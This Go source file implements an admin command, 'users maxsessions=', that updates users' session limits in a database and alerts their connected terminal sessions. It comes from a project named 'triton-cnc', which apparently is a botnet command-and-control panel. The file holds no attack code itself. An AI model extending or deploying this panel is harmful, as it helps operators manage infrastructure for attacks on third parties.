package users_edit

import (
	"strconv"
	"strings"
	"triton-cnc/core/mysql"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/json/build"
)


func MaxSessionLimitChange(session *sessions.Session_Store, cmd []string, stringsep []string) {

	if !strings.Contains(strings.Replace(strings.Join(stringsep, "="), stringsep[1], "", -1), "maxsessions=") || len(cmd) <= 2 {
		session.Channel.Write([]byte("\x1b[0m"+build.Config.AppConfig.AppName+" -> Command Example: users maxsessions=<New sessions> [users array, eg \"root root123456\"]\r\n"))
		return
	}

	MaxSess, error := strconv.Atoi(stringsep[1])
	if error != nil {
		session.Channel.Write([]byte("\x1b[0m"+build.Config.AppConfig.AppName+" -> maxsessions \""+stringsep[1]+"\" must be an int\r\n"))
		return
	}

	for LenCon := 2; LenCon < len(cmd); LenCon++ {
		User, error := database.GetUser(cmd[LenCon])
		if error != nil || User == nil {
			session.Channel.Write([]byte("\x1b[0m"+build.Config.AppConfig.AppName+" -> \""+cmd[LenCon]+"\" wasnt found in database!\r\n"))
			continue
		}

		if User.MaxSessions == MaxSess {
			session.Channel.Write([]byte("\x1b[0m"+build.Config.AppConfig.AppName+" -> \""+cmd[LenCon]+"\" max Session is already set to \""+stringsep[1]+"\"\r\n"))
			continue
		}

		boolen_error := database.EditFeild(cmd[LenCon], "MaxSessions", stringsep[1])
		if !boolen_error {
			session.Channel.Write([]byte("\x1b[0m"+build.Config.AppConfig.AppName+" -> failed to update \""+cmd[LenCon]+"\" max sessions in database\r\n"))
			continue
		} else {
			session.Channel.Write([]byte("\x1b[0m\"\x1b[38;5;105m"+cmd[LenCon]+"\x1b[0m\" max session limit has been changed\r\n"))
		}

		for _, Session := range sessions.SessionMap {
			if Session.User.Username == cmd[LenCon] {
				Session.Channel.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K \x1b[38;5;105mYour Max Sessions has been changed from "+strconv.Itoa(User.MaxSessions)+" to "+stringsep[1]+"\x1b[0m\x1b[38;5;15m\x1b8"))
				Session.User.MaxSessions = MaxSess
			}
		}

	}


}